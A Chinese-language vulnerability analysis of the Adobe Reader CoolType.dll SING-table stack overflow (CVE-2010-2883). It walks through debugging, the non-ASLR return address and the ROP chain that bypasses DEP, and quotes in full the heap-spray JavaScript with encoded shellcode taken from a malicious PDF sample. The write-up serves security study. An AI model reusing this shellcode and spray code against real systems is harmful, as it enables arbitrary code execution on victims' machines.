
# [原创]Adobe Reader栈溢出漏洞分析(CVE-2010-2883)

[TOC]

这个漏洞是《漏洞战争》里面的第一个漏洞，也是我分析的第一个漏洞。水平有限，如有错误还望各位大佬指正。

## 漏洞描述

`CVE-2010-2883`是Adobe Reader和Acrobat中的`CoolType.dll`库在解析字体文件SING表中的`uniqueName`项时存在的栈溢出漏洞，用户受骗打开了特制的PDF就有可能导致执行任意恶意代码

## 测试环境

| | 推荐使用的环境 |
| -------- | ----------------- |
| 操作系统 | `Windows XP SP3` |
| 虚拟机 | `VMware` |
| 调试器 | `OD IDA` |
| 漏洞软件 | `Adobe Reader9.3.4` |

## 静态分析

### 定位触发点

用IDA反汇编`CoolType.dll`库，查看字符串可发现SING字体

![](upload/attach/201906/833057_9NWA6X8EA242248.png)

![](upload/attach/201906/833057_895GBU7TU9QC42V.png)

### 分析漏洞成因

直接定位进去即可查看该库对sing表格的解析方式，主要是`strcat`造成的溢出漏洞

![](upload/attach/201906/833057_RB9WMBSJPGF6SFK.png)

![](upload/attach/201906/833057_RWHKZVTPM87SM9W.png)

可以注意到在地址`0x0803DDAB`处调用了`strcat`函数，先来看下`strcat`函数原型

```c++
char *strcat(char *dest, const char *src);
```

`strcat`会将参数`src`字符串复制到参数`dest`所指的字符串尾部，`dest`最后的结束字符`NULL`会被覆盖掉，并在连接后的字符串尾部再增加一个`NULL`

漏洞成因就是没有去验证`src`的长度是否可能会超出`dest`数组定义的长度。如果我们有可能超出`dest`数组定义的长度的数据放入`src`中有可能在后方调用`strcat`函数时覆盖栈区从而实现代码执行

## 动态调试

在复现环境中把Adobe Reader 9.3.4启动程序载入`OD`，加载之后按`F9`运行。此时`OD`显示当前调试程序是运行状态，实际上这个时候Adobe Reader就已经加载了`CoolType.dll`文件了。

通过刚刚的静态分析我们了解到SING在地址`0x0803DD74`处被引用，因此我们可以在`OD`中在这个地址处下一个断点

### 获取SING表的入口地址

`Ctrl+G`输入`0x0803DD74`回车跳转到该地址`F2`下断点

![](upload/attach/201906/833057_M73ZWED6D24Q5GD.png)

将样本(名企面试自助手册.pdf)拖入Adobe Reader中，程序就会停在刚才下的断点上面

`F7`单步到下面的地址

![](upload/attach/201906/833057_2NYJN3KQA5U6KUD.png)

此时`ecx`指向`0x12E404`，《漏洞战争》对这条指令的解释是这里是SING表的表的入口，我们来验证一下，数据窗口跟随看看这个指针里面存放的是什么

![](upload/attach/201906/833057_XJV9EYWHCCFG2ME.png)

在分析这段数据之前我们先来看看TrueType字体格式标准文档里

![](upload/attach/201906/833057_WUFNMY88D6SJTJ5.png)

在TrueType字体文件中，从0字节偏移的位置开始有一个表目录。且这个表目录的第一个字段是名为sfnt version是用来表明所用ttf格式版本的字段。在文档中清楚的说明了，对于1.0版本的TTF字体文件开头要用`0x00010000`来表示版本。

现在回到`0x2AEB710`位置处的数据，

![](upload/attach/201906/833057_TG26M2Q53A9D6NM.png)

会发现开头正好是`0x00010000`，这就证明了`ecx`保存的确实是SING表的指针

继续动态调试，接下来遇到一个`call`指令，不妨来看看这个函数传入了哪些参数

![](upload/attach/201906/833057_9ES5V2CSSWH59XA.png)

很明显它将SING字符串当作参数了，这个`call`实际上是在处理SING表，这里我们直接`F8`步过，继续单步

![](upload/attach/201906/833057_T6MSECR7THFF93B.png)

此时`eax`为`0x46949`，要想知道这块数据是什么，首先用`pdfStreamDumper`取出PDF样本中的TTF文件。TTF中关于SING表的TableEntry结构数据，如图所示

![](upload/attach/201906/833057_2TQ2NU4XE52QMGU.png)

下面是官方文档中对TableEntry结构的定义

```c++
typedef struct_SING
{
char tag[4] //标记->SING
ULONG checkSum //校验和->0xD9BCCBB5
ULONG offset //相对文件的偏移->011C
ULONG length //数据长度->0x1DDF
}
```

通过观察SING表中的结构我们可以知道在文件偏移`0x11C`处即是SING表的真实数据，`Ctrl+G`去到`0x11C`处，发现和`eax`所指向的`0x46949`是一致的，如图：

![](upload/attach/201906/833057_J3CP9YNWAFTUCH4.png)

通过确认这个`eax`所指向的内容我们可以推测出上面那个`call`的作用是取出SING表的入口地址

![](upload/attach/201906/833057_UJQ2HMEMAXSFACA.png)

接着比较`eax`和`esi`的值，检测SING表是否为空

![](upload/attach/201906/833057_NY3YA789UWFYDXB.png)

下面的`je`因为SING表不为空，所以不会跳转

![](upload/attach/201906/833057_EQ4S2JHT7QDEF89.png)

然后这里取出`eax`的内容赋给`ecx`，通过刚才的分析我们知道此时的`ecx`保存的是ttf的版本号，继续往下

![](upload/attach/201906/833057_MV5Z9BFPCAH653.png)

然后清掉低4位，结果为零，`je`跳转，继续往下

![](upload/attach/201906/833057_MQKWZ8DESGZX8S7.png)

接着将`eax`加上`0x10`，`eax`原来指向SING表，SING表加上`0x10`处指向的是`unique`域，在`010Editor`处如图：

![](upload/attach/201906/833057_8CTA8Y6RAHGHPFC.png)

### 溢出点

继续单步就能发现溢出点

![](upload/attach/201906/833057_HKREZ29HH4B4GWG.png)

这里将`uniqueName`域和当前的`ebp`入栈，然后调用`strcat`进行字符串拼接，但是没有进行安全检查，导致溢出，我们单步步过`strcat`后查看一下`ebp`开始的栈区数据

![](upload/attach/201906/833057_KEXZR86ACH5STJF.png)

此时栈溢出已经发生，函数的返回地址已经被覆盖为SING表中的恶意数据,在`010Editor`中如图

![](upload/attach/201906/833057_CZXAZ7PAKAPRF4G.png)

### 精心挑选的返回地址

这个地址位于`icucnv32.dll`中，让我们来看看这个地址有和特别之处，为什么会选择这样一个地址，用`010`打开`icucnv32.dll`

![](upload/attach/201906/833057_WYSM67B4766HHW3.png)

我们发现`IMAGE_OPTIONAL_HEADER`中的`IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE`的值为`0`，也就是说这个模块没有开启ASLR，这就保证了`exploit`的稳定性

![](upload/attach/201906/833057_XHW5MACRPH7UCB2.png)

继续往下分析，执行到`0x0808B308`时，`eax`的值指向`0x4A80CB38`，这个地址也是在`icucnv32.dll`中，我们`F7`跟进去，

![](upload/attach/201906/833057_7WQQ72REQSEDZ2W.png)

这个地址是精心挑选的ROP指令，首先调整了`ebp`，调整之后`ebp`为`0012E4DC`

![](upload/attach/201906/833057_Y56ZBWVA7YQFF65.png)

也就是将`ebp`调整到`strcat`函数调用后的栈区数据范围内，接下来执行`leave`，修改了`esp`

![](upload/attach/201906/833057_2DQHF3PF9E8NBY5.png)

最后`retn`会跳转到`0x4A82A714`地址处，继续`F7`单步

![](upload/attach/201906/833057_8GWH2V645HE3XHB.png)

`pop esp`之后，`esp`将被修改为`0x0C0C0C0C`,然后返回，此时栈的情况如图：

![](upload/attach/201906/833057_BCU658ZQG8G86M4.png)

### JavaScript实现HeapSpray

上面的`0x0C0C0C0C`是样本特意构造的，自然是为了实现 HeapSpary堆喷射技术，借助PDF本身支持执行JS的特性，将ShellCode借助JS写入内存中。栈中的数据即是JS代码中的ShellCode，作者利用它来实现ROP以绕过DEP保护。

这里借助`PDFStreamDumper`工具提取样本中这段实现堆喷射的JS代码

```javascript
var var_shellcode =
unescape( '%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ub5ba%uda4b%udd0e%ud9c1%u2474%u5ef4%uc933%u31b1%u5631%u0313%u1356%uee83%ua949%uf22f%uac59%u0bd0%ud199%uee59%ud1a8%u7a3e%ue19a%u2e35%u8916%udb18%uffad%uecb4%ub506%uc3e2%ue697%u42d7%uf51b%ua50b%u3622%ua45e%u2b63%uf493%u273c%ue906%u7d49%u829b%u9301%u779b%u92d1%u298a%ucd6a%ucb0c%u65bf%ud305%u40dc%u68df%u3e16%ub8de%ubf67%u854d%u3248%uc18f%uad6e%u3bfa%u508d%ufffd%u8eec%u1b88%u4456%uc02a%u8967%u83ad%u666b%uccb9%u796f%u676e%uf28b%ua891%u401a%u6cb6%u1247%u35d7%uf52d%u26e8%uaa8e%u2c4c%ube22%u6ffc%u4128%u0a72%u411e%u158c%u2a0e%u9ebd%u2dc1%u7542%uc2a6%ud408%u4a8e%u8cd5%u1693%u7ae6%u2ed7%u8f65%ud4a7%ufa75%u91a2%u1631%u8ade%u18d7%uaa4d%u7afd%u3810%u529d%ub8b7%uab04' );
var var_c = unescape( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
while (var_c.length + 20 + 8 < 0x10000) var_c+=var_c;
var_b = var_c.substring(0, (0x0c0c-0x24)/2);
var_b += var_shellcode;
var_b += var_c;
var_d = var_b.substring(0, 0x10000/2);
while(var_d.length < 0x80000) var_d += var_d;
var_3 = var_d.substring(0, 0x80000 - (0x1020-0x08) / 2);
var var_4 = new Array();
for (var_i=0;var_i<0x1f0;var_i++) var_4[var_i]=var_3+"s";
```

所有的ShellCode都被转化为了十六进制的转义序列，经过`unescape`解码之后存储在`var_shellcode`之中，`var_c`变量存储了`%u0c0c%u0c0c`，接下来用了一个`while`循环叠加`var_c`，用来覆盖内存的数据。

采用`0x0c0c0c0c`作为滑板指令的原因是因为它对应的指令是`or al,0x0C`，这样的指令执行的效果对`al`寄存器不会产生任何影响

接下来的`var_b`保存了前面是所有滑板指令以及ShellCode，最关键的实现堆喷射的语句是`new Array()`，利用数据来开辟内存区域，然后通过填充数据的方式来喷射ShellCode

### 利用ROP链绕过DEP保护

继续调试

![](upload/attach/201906/833057_Q9Z7UMXZA2PEXA4.png)

这里`ecx =0x4A8A0000 [ecx] = "UTF-32"`，然后返回

![](upload/attach/201906/833057_55JSUJQX7MM5YH2.png)

这里借原本存“UTF-32”字符串的地方保存`eax`的值，然后再次返回

![](upload/attach/201906/833057_6PQRVC8373AB3AM.png)

这里`eax`指向了`CreateFileA`

![](upload/attach/201906/833057_KFTTEHCDAK2X8MT.png)

然后返回去跳转执行`CreateFileA`，我们直接查看`CreateFileA`在栈区的参数

![](upload/attach/201906/833057_V6BF5FE2ZKEJPW7.png)

这里以隐藏的方式创建了一个临时文件，文件名为`iso88591`，可以在当前样本的同路径下找到，我们直接按`Ctrl+F9`返回

![](upload/attach/201906/833057_AA3DAJZ2KPQ5D6W.png)

这里会跳转到`0x4A8063A5`

![](upload/attach/201906/833057_XYWA4J5CQMDG5W9.png)

然后将`ecx`赋值为`4A801064`，接着跳转到`0x4A842DB2`

![](upload/attach/201906/833057_38QMBXSMJUPTCAH.png)

这里交换`eax`和`edi`寄存器的值，接着跳转到`0x4A802AB1`，继续单步

![](upload/attach/201906/833057_PAZP5CFWUDXBQYT.png)

此时`ebx`为`0x8`，跳转到`0x4A80A8A6`

![](upload/attach/201906/833057_DJGMERHND8MNGPJ.png)

这里指向了一个函数的实现模块

![](upload/attach/201906/833057_PENCSCRX89BEHUF.png)

接着用相同的方法调用`CreateFileMappingA`，创建文件映射对象，再来查看一下堆栈中的参数

![](upload/attach/201906/833057_YE289ZCW7Z2HWH8.png)
